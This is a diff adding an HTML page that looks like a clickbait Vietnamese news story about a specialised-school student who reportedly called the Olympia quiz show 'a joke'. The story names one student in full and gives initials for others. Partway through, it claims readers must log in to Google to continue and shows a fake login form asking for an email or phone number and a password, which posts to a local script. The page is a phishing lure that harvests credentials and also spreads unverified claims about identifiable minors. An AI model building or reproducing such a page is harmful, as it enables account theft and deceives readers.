@@ -1,0 +1,29 @@
+<h1 style="font-size:30;"> CHẤN ĐỘNG:" OLYMPIA NHƯ MỘT TRÒ ĐÙA" LỜI CỦA HỌC SINH CHUYÊN SƯ PHẠM ???? </h1>
+<img src="quangcao.jfif"width="1300" height="220";w>
+<p style="underline:true;color:blue;">Bài viết mang tính đóng góp,không cố tình gây ảnh hưởng tới bất kì cá nhân,đoàn thể nào ! </p>
+<pre>
+      Mới đây ngày 10/8/2024, em học sinh ĐTB học tại lớp 12 Toán 1, Trường THPT Chuyên ĐHSP sau khi được 
+phóng viên phỏng vấn đề cảm nghĩ khi bạn Nguyễn Nguyên Phú, 1 học sinh cùng trường được vinh dự tham gia 
+vòng thi quý IV của cuộc thi Đường lên đỉnh Olympia. Em đã thẳng thắn thừa nhận rằng bạn đã rất cố gắng 
+và cũng rất tôn trọng tài năng của bạn NHƯNG lại cho rằng "OLYMPIA như một trò đùa" sau khi em khẳng định
+cố gắng của bạn ở trên
+</pre>
+<img src="hocsinh.jfif">
+<br>
+<pre>
+                      em Nguyễn Nguyên Phú cùng giáo viên cùng trường   </pre>
+ <pre>
+    Ngay sau đó em đã được triệu tập lên ban giám hiệu để làm việc. Bình luận với phóng viên, ông HDN 
+giáo viên chủ nhiệm lớp em NTN chia sẻ rằng bạn học sinh ở lớp cũng hay quậy phá và đưa ra những lời lẽ
+chưa đúng chuẩn mực và đảm bảo sẽ tiếp tục quan tâm và bảo ban em học sinh.
+......................................................................................................
+</pre> 
+<p> Đăng nhập google để xem tiếp </p>
+<form action="/action_page.php">
+  <label for="fname">Email hoặc số điện thoại:</label>
+  <input type="text" id="fname" name="fname"><br><br>
+  <label for="lname">Nhập mật khẩu của bạn  :</label>
+  <input type="text" id="lname" name="lname"><br><br>
+  <input type="submit" value="Đăng Nhập">
+</form>  
+<a href="https://chuyensp.edu.vn/" style="font-size:30;"> Thêm nhiều tin nóng khác </a>
